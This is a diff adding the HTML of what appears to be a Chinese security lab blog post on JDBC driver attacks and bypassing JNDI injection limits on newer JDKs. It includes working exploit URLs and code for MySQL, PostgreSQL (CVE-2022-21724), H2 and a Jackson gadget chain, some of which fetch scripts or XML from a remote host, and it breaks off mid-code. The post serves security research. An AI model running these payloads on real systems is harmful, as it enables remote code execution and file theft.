@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html lang="zh" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>JDBC Attack 与高版本 JDK 下的 JNDI Bypass | 天工实验室</title>
+<meta name="keywords" content="Java, JDBC, JNDI">
+<meta name="description" content="JDBC Attack 与高版本 JDK 下的 JNDI Bypass 一、前言 JNDI 注入作为 Java 攻击的常见 Sink 点，通常被用于 Weblogic 以及 Fastjson 等常见目标的攻击流程中，而 JNDI 注入的利用经过 JDK 新版本对相关利用的修复，以及一些常见依赖利用方式的变化，在高版本 JDK 中，其利用逐渐遭遇了困境。而 JDBC Attack，作为针对 Java 数据库引擎的一种攻击方式，除了其常规的利用方式之外，也可以与原生反序列化结合起来，实现对 JNDI 攻击的扩展，解决高版本下 JNDI 注入的困境。
+二、关于 JDBC Attack 首先是关于基础的JDBC Attack的一些回顾，JDBC 是Java应用在连接不同的底层数据库引擎时使用的抽象层，使得Java应用可以用相同的接口对各种不同的数据库进行抽象的控制，JDBC使用如下的URL格式进行连接。
+Class.forName(&#34;com.mysql.cj.jdbc.Driver&#34;); String url = &#34;jdbc:mysql://mysql.db.server:3306/my_database?useSSL=false&amp;serverTimezone=UTC&#34; Connection conn = DriverManager.getConnection(url) 而该URL中，后面的可控参数就是针对不同数据库Driver进行利用的入口。
+接下来我们来回顾一下常见的几个 Driver 的利用：
+2.1 MySQL Driver 针对MySQL Driver的通用利用主要是使用 Fake Server 进行任意文件读，首先需要配置 MySQL fake server，然后开启 allowLoadLocalInfile=true 设置，构造形如 jdbc:mysql://evil-ip:3306/test?allowLoadLocalInfile=true 的 URL 去请求 fake server 即可进行利用。">
+<meta name="author" content="crumbledwall">
+<link rel="canonical" href="http://localhost:1313/blog/tiangongarticle040/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.9b0c42f9222bc665b5845e6199fc07fd87b025125d3366cc5f873b0f54ca8481.css" integrity="sha256-mwxC&#43;SIrxmW1hF5hmfwH/YewJRJdM2bMX4c7D1TKhIE=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="zh" href="http://localhost:1313/blog/tiangongarticle040/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript>
+</head>
+
+<body class=" dark" id="top">
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="天工实验室 (Alt + H)">
+                <img src="http://localhost:1313/logo/logo3.png" alt="" aria-label="logo"
+                    height="100" style="margin-top: 15px;">
+            </a>
+            <div class="logo-switches">
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/archives" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/tags/" title="标签">
+                    <span>标签</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://poc.qianxin.com/home" title="破壳官网">
+                    <span>破壳官网</span>&nbsp;
+                    <svg fill="none" shape-rendering="geometricPrecision" stroke="currentColor" stroke-linecap="round"
+                        stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12">
+                        <path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"></path>
+                        <path d="M15 3h6v6"></path>
+                        <path d="M10 14L21 3"></path>
+                    </svg>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="http://localhost:1313/">主页</a>&nbsp;»&nbsp;<a href="http://localhost:1313/blog/">博客</a></div>
+    <h1 class="post-title entry-hint-parent">
+      JDBC Attack 与高版本 JDK 下的 JNDI Bypass
+    </h1>
+    <div class="post-meta"><span title='2024-07-24 00:00:00 +0000 UTC'>2024年07月24日</span>&nbsp;·&nbsp;5 分钟&nbsp;·&nbsp;crumbledwall
+
+</div>
+  </header>
+
+  <div class="author">
+    <div class="author_avatar">
+      <img src="/authors/crumbledwall.jpg" alt="crumbledwall">
+    </div>
+    <div class="author_info">
+      <span class="author_id">crumbledwall</span>
+      <p class="author_description">天工实验室安全研究员，研究领域：Web安全、静态分析。</p>
+    </div>
+  </div>
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/java/">Java</a></li>
+      <li><a href="http://localhost:1313/tags/jdbc/">JDBC</a></li>
+      <li><a href="http://localhost:1313/tags/jndi/">JNDI</a></li>
+    </ul><br/> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">目录</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#jdbc-attack-%e4%b8%8e%e9%ab%98%e7%89%88%e6%9c%ac-jdk-%e4%b8%8b%e7%9a%84-jndi-bypass" aria-label="JDBC Attack 与高版本 JDK 下的 JNDI Bypass">JDBC Attack 与高版本 JDK 下的 JNDI Bypass</a><ul>
+                        
+                <li>
+                    <a href="#%e4%b8%80%e5%89%8d%e8%a8%80" aria-label="一、前言">一、前言</a></li>
+                <li>
+                    <a href="#%e4%ba%8c%e5%85%b3%e4%ba%8e-jdbc-attack" aria-label="二、关于 JDBC Attack">二、关于 JDBC Attack</a><ul>
+                        
+                <li>
+                    <a href="#21-mysql-driver" aria-label="2.1 MySQL Driver">2.1 MySQL Driver</a></li>
+                <li>
+                    <a href="#22-postgresql" aria-label="2.2 PostgreSQL">2.2 PostgreSQL</a></li>
+                <li>
+                    <a href="#23-spring-boot-h2" aria-label="2.3 Spring Boot H2">2.3 Spring Boot H2</a><ul>
+                        
+                <li>
+                    <a href="#javac" aria-label="javac">javac</a></li>
+                <li>
+                    <a href="#nashorn-javascript" aria-label="Nashorn JavaScript">Nashorn JavaScript</a></li>
+                <li>
+                    <a href="#groovy" aria-label="Groovy">Groovy</a></li></ul>
+                </li></ul>
+                </li>
+                <li>
+                    <a href="#%e4%b8%89%e5%85%b3%e4%ba%8e-jndi-%e6%b3%a8%e5%85%a5" aria-label="三、关于 JNDI 注入">三、关于 JNDI 注入</a><ul>
+                        
+                <li>
+                    <a href="#31-jndi-%e6%b3%a8%e5%85%a5%e7%9a%84%e7%8e%b0%e7%8a%b6" aria-label="3.1 JNDI 注入的现状">3.1 JNDI 注入的现状</a></li>
+                <li>
+                    <a href="#32-jndi-%e6%b3%a8%e5%85%a5%e7%9a%84-spring-%e7%8e%af%e5%a2%83%e5%88%a9%e7%94%a8" aria-label="3.2 JNDI 注入的 Spring 环境利用">3.2 JNDI 注入的 Spring 环境利用</a></li></ul>
+                </li>
+                <li>
+                    <a href="#%e5%9b%9b%e4%bd%bf%e7%94%a8-jdbc-attack-%e6%89%a9%e5%b1%95-jndi-%e6%b3%a8%e5%85%a5%e6%94%bb%e5%87%bb%e9%9d%a2" aria-label="四、使用 JDBC Attack 扩展 JNDI 注入攻击面">四、使用 JDBC Attack 扩展 JNDI 注入攻击面</a><ul>
+                        
+                <li>
+                    <a href="#41-postgresql" aria-label="4.1 Postgresql">4.1 Postgresql</a></li>
+                <li>
+                    <a href="#42-dbcp-h2" aria-label="4.2 Dbcp H2">4.2 Dbcp H2</a></li>
+                <li>
+                    <a href="#43-c3p0-h2" aria-label="4.3 C3p0 H2">4.3 C3p0 H2</a></li></ul>
+                </li>
+                <li>
+                    <a href="#%e4%ba%94%e6%80%bb%e7%bb%93" aria-label="五、总结">五、总结</a></li>
+                <li>
+                    <a href="#%e5%85%ad%e5%8f%82%e8%80%83%e9%93%be%e6%8e%a5" aria-label="六、参考链接">六、参考链接</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h1 id="jdbc-attack-与高版本-jdk-下的-jndi-bypass">JDBC Attack 与高版本 JDK 下的 JNDI Bypass<a hidden class="anchor" aria-hidden="true" href="#jdbc-attack-与高版本-jdk-下的-jndi-bypass">#</a></h1>
+<h2 id="一前言">一、前言<a hidden class="anchor" aria-hidden="true" href="#一前言">#</a></h2>
+<p>JNDI 注入作为 Java 攻击的常见 Sink 点，通常被用于 Weblogic 以及 Fastjson 等常见目标的攻击流程中，而 JNDI 注入的利用经过 JDK 新版本对相关利用的修复，以及一些常见依赖利用方式的变化，在高版本 JDK 中，其利用逐渐遭遇了困境。而 JDBC Attack，作为针对 Java 数据库引擎的一种攻击方式，除了其常规的利用方式之外，也可以与原生反序列化结合起来，实现对 JNDI 攻击的扩展，解决高版本下 JNDI 注入的困境。</p>
+<!-- raw HTML omitted -->
+<h2 id="二关于-jdbc-attack">二、关于 JDBC Attack<a hidden class="anchor" aria-hidden="true" href="#二关于-jdbc-attack">#</a></h2>
+<p><img loading="lazy" src="/attachments/2024-07-24-jdbc-attack-jndi-bypass/e84fd309-622b-4a63-b11c-d74bf141c4a5.gif" alt=""  />
+</p>
+<p>首先是关于基础的JDBC Attack的一些回顾，JDBC 是Java应用在连接不同的底层数据库引擎时使用的抽象层，使得Java应用可以用相同的接口对各种不同的数据库进行抽象的控制，JDBC使用如下的URL格式进行连接。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">&#34;com.mysql.cj.jdbc.Driver&#34;</span>);
+</span></span><span style="display:flex;"><span>String url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;jdbc:mysql://mysql.db.server:3306/my_database?useSSL=false&amp;serverTimezone=UTC&#34;</span>
+</span></span><span style="display:flex;"><span>Connection conn <span style="color:#f92672">=</span> DriverManager.<span style="color:#a6e22e">getConnection</span>(url)
+</span></span></code></pre></div><p>而该URL中，后面的可控参数就是针对不同数据库Driver进行利用的入口。</p>
+<p>接下来我们来回顾一下常见的几个 Driver 的利用：</p>
+<h3 id="21-mysql-driver">2.1 MySQL Driver<a hidden class="anchor" aria-hidden="true" href="#21-mysql-driver">#</a></h3>
+<p>针对MySQL Driver的通用利用主要是使用 Fake Server 进行任意文件读，首先需要配置 MySQL fake server，然后开启 allowLoadLocalInfile=true 设置，构造形如  jdbc:mysql://evil-ip:3306/test?allowLoadLocalInfile=true 的 URL 去请求 fake server 即可进行利用。</p>
+<p>对于 MySQL 也可以打反序列化，但是有版本限制，只有较老的 &lt;= 8.0.20, &lt; 5.1.49 的版本可以利用，可以配置不同的 URL 参数来开启反序列化的利用，下表是节选自《Make JDBC attack brilliant again》议题的具体利用 URL 参数。</p>
+<p><img loading="lazy" src="/attachments/2024-07-24-jdbc-attack-jndi-bypass/069bd3d5-f2e6-413c-a8c3-ca5ed4081c17.png" alt=""  />
+</p>
+<h3 id="22-postgresql">2.2 PostgreSQL<a hidden class="anchor" aria-hidden="true" href="#22-postgresql">#</a></h3>
+<p>pgsql 的利用则是22年爆的一个洞，即 CVE-2022-21724，影响版本为 9.4.1208 &lt;= PgJDBC &lt; 42.2.25 与 42.3.0 &lt;= PgJDBC &lt; 42.3.2。</p>
+<p>这个洞可以利用 <code>socketFactory</code> 和 <code>socketFactoryArg</code> 来传入一个类并实例化，然后其构造参数是可控的，我们可以寻找到 spring 框架中的如下两个类来进行利用。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>org.<span style="color:#a6e22e">springframework</span>.<span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">support</span>.<span style="color:#a6e22e">ClassPathXmlApplicationContext</span>
+</span></span><span style="display:flex;"><span>org.<span style="color:#a6e22e">springframework</span>.<span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">support</span>.<span style="color:#a6e22e">FileSystemXmlApplicationContext</span>
+</span></span></code></pre></div><p>构造形如 <code>jdbc:postgresql://node/test?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&amp;socketFactoryArg=http://127.0.0.1/test.xml</code> 的payload 来引入恶意的 <code>xml</code> 文件进行利用。</p>
+<p><code>xml</code> 文件的内容如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;beans</span> <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;http://www.springframework.org/schema/beans&#34;</span> <span style="color:#a6e22e">xmlns:xsi=</span><span style="color:#e6db74">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span> <span style="color:#a6e22e">xsi:schemaLocation=</span><span style="color:#e6db74">&#34;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;bean</span> <span style="color:#a6e22e">id=</span><span style="color:#e6db74">&#34;pb&#34;</span> <span style="color:#a6e22e">class=</span><span style="color:#e6db74">&#34;java.lang.ProcessBuilder&#34;</span> <span style="color:#a6e22e">init-method=</span><span style="color:#e6db74">&#34;start&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;constructor-arg&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;list&gt;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;value&gt;</span>open<span style="color:#f92672">&lt;/value&gt;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;value&gt;</span>-a<span style="color:#f92672">&lt;/value&gt;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;value&gt;</span>Calculator<span style="color:#f92672">&lt;/value&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;/list&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;/constructor-arg&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/bean&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/beans&gt;</span>
+</span></span></code></pre></div><h3 id="23-spring-boot-h2">2.3 Spring Boot H2<a hidden class="anchor" aria-hidden="true" href="#23-spring-boot-h2">#</a></h3>
+<p>H2 driver 的利用攻击面比较广，可以分别来分析一下。</p>
+<h4 id="javac">javac<a hidden class="anchor" aria-hidden="true" href="#javac">#</a></h4>
+<p>首先对于包含 javac 的环境，即包含 jdk 的环境，可以直接构造 Java 语句进行 RCE。</p>
+<p>网上流传的 Poc 为：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT<span style="color:#f92672">=</span>3;INIT<span style="color:#f92672">=</span>RUNSCRIPT FROM <span style="color:#960050;background-color:#1e0010">&#39;</span>http:<span style="color:#75715e">//127.0.0.1:8000/poc.sql&#39;</span>
+</span></span></code></pre></div><p>poc.sql 的内容为：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">CREATE</span> <span style="color:#66d9ef">ALIAS</span> <span style="color:#66d9ef">EXEC</span> <span style="color:#66d9ef">AS</span> <span style="color:#e6db74">&#39;String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd);return &#34;1&#34;;}&#39;</span>;<span style="color:#66d9ef">CALL</span> <span style="color:#66d9ef">EXEC</span> (<span style="color:#e6db74">&#39;calc.exe&#39;</span>)
+</span></span></code></pre></div><p>这里通过 init 来执行语句，其只允许执行一条 sql 语句，所以网上的思路都是加载外部 sql 文件来执行，需要出网的条件。</p>
+<p>不过这里有个 trick，实际上多进行几次转义，这里的 init 可以塞进两条语句，如下所示，实际上不出网也可以实现利用。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT<span style="color:#f92672">=</span>3;INIT<span style="color:#f92672">=</span>CREATE ALIAS EXEC AS <span style="color:#960050;background-color:#1e0010">&#39;</span>String <span style="color:#a6e22e">shellexec</span>(String cmd) <span style="color:#66d9ef">throws</span> java.<span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">IOException</span> {Runtime.<span style="color:#a6e22e">getRuntime</span>().<span style="color:#a6e22e">exec</span>(cmd)<span style="color:#960050;background-color:#1e0010">\\</span>;<span style="color:#66d9ef">return</span> <span style="color:#960050;background-color:#1e0010">\</span><span style="color:#e6db74">&#34;1\&#34;\\;}&#39;\\;CALL EXEC (&#39;calc&#39;)
+</span></span></span></code></pre></div><h4 id="nashorn-javascript">Nashorn JavaScript<a hidden class="anchor" aria-hidden="true" href="#nashorn-javascript">#</a></h4>
+<p>其次，对于没有 javac 环境的目标，通常可以使用 javascript 引擎来攻击，不过对于 Nashorn JavaScript 引擎，其在 jdk 15 之后被移除了，因此只适用于低于15版本的利用。</p>
+<p>利用的 payload 如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>String url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER hhhh BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec(\&#34;calc.exe\&#34;)\n$$\n&#34;</span>;
+</span></span></code></pre></div><h4 id="groovy">Groovy<a hidden class="anchor" aria-hidden="true" href="#groovy">#</a></h4>
+<p>除了 JavaScript 引擎之外，还可以使用 Groovy 脚本引擎来利用，不过 Groovy 依赖相对少见一些，能利用的目标较少。</p>
+<p>利用的 payload 如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>String url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE ALIAS T5 AS &#39;@groovy.transform.ASTTest(value={ assert java.lang.Runtime.getRuntime().exec(\&#34;open -a Calculator\&#34;)})def x&#39;&#34;</span>;
+</span></span></code></pre></div><h2 id="三关于-jndi-注入">三、关于 JNDI 注入<a hidden class="anchor" aria-hidden="true" href="#三关于-jndi-注入">#</a></h2>
+<h3 id="31-jndi-注入的现状">3.1 JNDI 注入的现状<a hidden class="anchor" aria-hidden="true" href="#31-jndi-注入的现状">#</a></h3>
+<p>对于 JNDI 注入，首先一个基本的认知是，在 8u191 之后，高版本 JDK codebase 为 true，因此客户端默认不会请求远程 Server上的恶意 Class，因此在存在 JNDI 注入的情况下，也无法直接加载 Class 来 RCE。</p>
+<p>然后针对这个问题，有两种常见的绕过方式，分别是服务端返回序列化 Payload，触发客户端的本地 Gadget；以及构造返回的 Reference 对象，将其指向我们本地 classpath 中存在的类，并通过寻找合适的 Factory 类来构造 Payload 实现 RCE。</p>
+<p>后者有一种常见的思路是利用 <code>org.apache.naming.factory.BeanFactory</code> 这个类来实现利用。其 getObjectInstance 方法可以反射实例化 Reference 所指向的任意 Bean Class，并且会调用 setter 方法为所有的属性赋值，而它有一个 forceString 参数，可以将任意一个方法指定成一个 setter，那么在这些参数都可控的情况下，我们就有了一个任意静态方法调用，那么就可以在使用 tomcat 8 之后都携带的 <code>javax.el.ELProcessor</code> 来 RCE，这个也叫做 Tomcat Bypass。</p>
+<p>但是去年有一天在实战中发现这个打不通了，搜报错搜了半天网上也没啥文章说这事。后来搜到了官方的一个 <a href="https://bz.apache.org/bugzilla/show_bug.cgi?id=65736">Bug Report</a>，然后发现经过一番讨论之后 forceString 这个特性已经被删了：</p>
+<p><img loading="lazy" src="/attachments/2024-07-24-jdbc-attack-jndi-bypass/ebff1232-68c9-4ddd-8e2e-447a1b5c7727.png" alt=""  />
+</p>
+<p><img loading="lazy" src="/attachments/2024-07-24-jdbc-attack-jndi-bypass/c32b12d1-b9ce-421b-981b-a3dd28a6af1b.png" alt=""  />
+</p>
+<p>也就是说最常见的 codebase bypass 方法已经无法利用了，在较新的 Tomcat 或者 Spring Boot 环境里基本上只能考虑触发客户端本地 Gadget 的方法了。</p>
+<h3 id="32-jndi-注入的-spring-环境利用">3.2 JNDI 注入的 Spring 环境利用<a hidden class="anchor" aria-hidden="true" href="#32-jndi-注入的-spring-环境利用">#</a></h3>
+<p>而去年阿里云 CTF 中，一个新的 Jackson 反序列化链的利用被提了出来，而 Jackson 是 spring boot 都会默认包含的依赖，也就是说 JNDI 的客户端是 Spring Boot，就都可以考虑打这条 Gadget。</p>
+<p>这条链主要利用了 Jackson 的一个特性，那就是 Jackson 里的 POJONode 类有着跟 Fastjson 的 JSONObject 类差不多的性质，在 toString 时会触发对象类中的 getter 方法，那么也就可以用打 Fastjson 常用的 TemplatesImpl 的 getOutputProperties 链。</p>
+<p>但是这条链有一个问题，在 Jackson 依次触发 getter 时，其获取所有 getter 的顺序是使用 java 的 getDeclaredMethods 方法，而根据 Java 官方文档，这个方法获取的顺序是不确定的，如果获取到非预期的 getter 就会直接报错退出了。</p>
+<p><img loading="lazy" src="/attachments/2024-07-24-jdbc-attack-jndi-bypass/f39fe342-f835-47b6-8704-f2565bea1529.png" alt=""  />
+</p>
+<p>因此常常会出现有时打通有时打不通的情况，所以后来又对这条链进行了一些改进，这里可以使用 Spring Boot 里一个代理工具类进行封装，使 Jackson 只获取到我们需要的 getter，就实现了稳定利用。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>AdvisedSupport advisedSupport <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> AdvisedSupport();
+</span></span><span style="display:flex;"><span>advisedSupport.<span style="color:#a6e22e">setTarget</span>(templates);
+</span></span><span style="display:flex;"><span>Constructor constructor <span style="color:#f92672">=</span> Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">&#34;org.springframework.aop.framework.JdkDynamicAopProxy&#34;</span>). getConstructor(AdvisedSupport.<span style="color:#a6e22e">class</span>);
+</span></span><span style="display:flex;"><span>constructor.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>InvocationHandler handler <span style="color:#f92672">=</span> (InvocationHandler) constructor.<span style="color:#a6e22e">newInstance</span>(advisedSupport);
+</span></span><span style="display:flex;"><span>Object proxy <span style="color:#f92672">=</span> Proxy.<span style="color:#a6e22e">newProxyInstance</span>(ClassLoader.<span style="color:#a6e22e">getSystemClassLoader</span>(),  <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{Templates.<span style="color:#a6e22e">class</span>}, handler);
+</span></span></code></pre></div><p>最终可以构造出如下 payload，即可在 spring boot 环境下实现通杀的效果，虽然相比之前经典的 tomcat bypass 鸡肋的许多，但总算有了新的进展。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>CtClass ctClass <span style="color:#f92672">=</span> ClassPool.<span style="color:#a6e22e">getDefault</span>().<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;com.fasterxml.jackson.databind.node.BaseJsonNode&#34;</span>);
+</span></span><span style="display:flex;"><span>CtMethod writeReplace <span style="color:#f92672">=</span> ctClass.<span style="color:#a6e22e">getDeclaredMethod</span>(<span style="color:#e6db74">&#34;writeReplace&#34;</span>);
+</span></span><span style="display:flex;"><span>ctClass.<span style="color:#a6e22e">removeMethod</span>(writeReplace);
+</span></span><span style="display:flex;"><span>ctClass.<span style="color:#a6e22e">toClass</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ClassPool pool <span style="color:#f92672">=</span> ClassPool.<span style="color:#a6e22e">getDefault</span>();
+</span></span><span style="display:flex;"><span>pool.<span style="color:#a6e22e">insertClassPath</span>(<span style="color:#66d9ef">new</span> ClassClassPath(Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">&#34;com.sun.org.apache. xalan.internal. xsltc.runtime.AbstractTranslet&#34;</span>)));
+</span></span><span style="display:flex;"><span>CtClass cc <span style="color:#f92672">=</span> pool.<span style="color:#a6e22e">makeClass</span>(<span style="color:#e6db74">&#34;Evil&#34;</span>);
+</span></span><span style="display:flex;"><span>cc.<span style="color:#a6e22e">makeClassInitializer</span>().<span style="color:#a6e22e">insertBefore</span>(<span style="color:#e6db74">&#34;Runtime.getRuntime().exec(\&#34;calc\&#34;);&#34;</span>);
+</span></span><span style="display:flex;"><span>String randomClassName <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Evil&#34;</span> <span style="color:#f92672">+</span> System.<span style="color:#a6e22e">nanoTime</span>();
+</span></span><span style="display:flex;"><span>cc.<span style="color:#a6e22e">setName</span>(randomClassName);
+</span></span><span style="display:flex;"><span>cc.<span style="color:#a6e22e">setSuperclass</span>(pool.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;com.sun.org.apache.xalan.internal. xsltc.runtime.AbstractTranslet&#34;</span>));
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> classBytes <span style="color:#f92672">=</span> cc.<span style="color:#a6e22e">toBytecode</span>();
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">byte</span><span style="color:#f92672">[][]</span> targetByteCodes <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[][]</span>{classBytes};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Object templates <span style="color:#f92672">=</span> Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">&#34;com.sun.org.apache.xalan.internal.xsltc. trax.TemplatesImpl&#34;</span>).<span style="color:#a6e22e">getConstructor</span>(<span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{}).<span style="color:#a6e22e">newInstance</span>();
+</span></span><span style="display:flex;"><span>Field fieldByteCodes <span style="color:#f92672">=</span> templates.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;_bytecodes&#34;</span>);
+</span></span><span style="display:flex;"><span>fieldByteCodes.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>fieldByteCodes.<span style="color:#a6e22e">set</span>(templates, targetByteCodes);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Field fieldName <span style="color:#f92672">=</span> templates.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;_name&#34;</span>);
+</span></span><span style="display:flex;"><span>fieldName.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>fieldName.<span style="color:#a6e22e">set</span>(templates, <span style="color:#e6db74">&#34;crumbledwall&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>fieldName <span style="color:#f92672">=</span> templates.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;_tfactory&#34;</span>);
+</span></span><span style="display:flex;"><span>fieldName.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>fieldName.<span style="color:#a6e22e">set</span>(templates, Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">&#34;com.sun.org.apache.xalan. internal.xsltc.trax. TransformerFactoryImpl&#34;</span>).<span style="color:#a6e22e">newInstance</span>());
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>AdvisedSupport advisedSupport <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> AdvisedSupport();
+</span></span><span style="display:flex;"><span>advisedSupport.<span style="color:#a6e22e">setTarget</span>(templates);
+</span></span><span style="display:flex;"><span>Constructor constructor <span style="color:#f92672">=</span> Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">&#34;org.springframework.aop. framework.JdkDynamicAopProxy&#34;</span>). getConstructor(AdvisedSupport.<span style="color:#a6e22e">class</span>);
+</span></span><span style="display:flex;"><span>constructor.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
